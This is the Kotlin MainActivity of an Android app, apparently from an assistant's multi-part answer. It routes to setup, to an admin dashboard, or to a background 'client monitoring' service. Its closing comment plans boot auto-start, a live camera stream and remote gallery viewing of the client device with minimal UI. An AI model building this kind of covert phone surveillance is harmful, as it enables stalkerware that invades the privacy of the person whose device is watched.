package com.example.cpu

import android.content.Intent
import android.os.Bundle
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import com.example.cpu.utils.PrefsManager


class MainActivity : AppCompatActivity() {

    private lateinit var prefsManager: PrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prefsManager = PrefsManager(this)

        // Check if setup is complete
        if (!prefsManager.isSetupComplete()) {
            // First time - go to setup
            startActivity(Intent(this, SetupActivity::class.java))
            finish()
        } else {
            // Setup done - route to appropriate screen
            if (prefsManager.isAdmin()) {
                startActivity(Intent(this, AdminDashboardActivity::class.java))
            } else {
                // Client mode - start monitoring service
                startClientMonitoring()
            }
            finish()
        }
    }

    private fun startClientMonitoring() {
        val serviceIntent = Intent(this, ClientMonitoringService::class.java)
        startForegroundService(serviceIntent)

        // Show minimal UI or finish
        finish()
    }
}

// CONTINUED IN NEXT MESSAGE DUE TO LENGTH...
// This includes:
// - SetupActivity (choose Admin or Client)
// - AdminDashboardActivity (view all data, camera, gallery)
// - ClientMonitoringService (runs in background)
// - BootReceiver (auto-start after reboot)
// - CameraStreamActivity (live camera feed)
// - GalleryViewActivity (view client's photos)
// - All layout XML files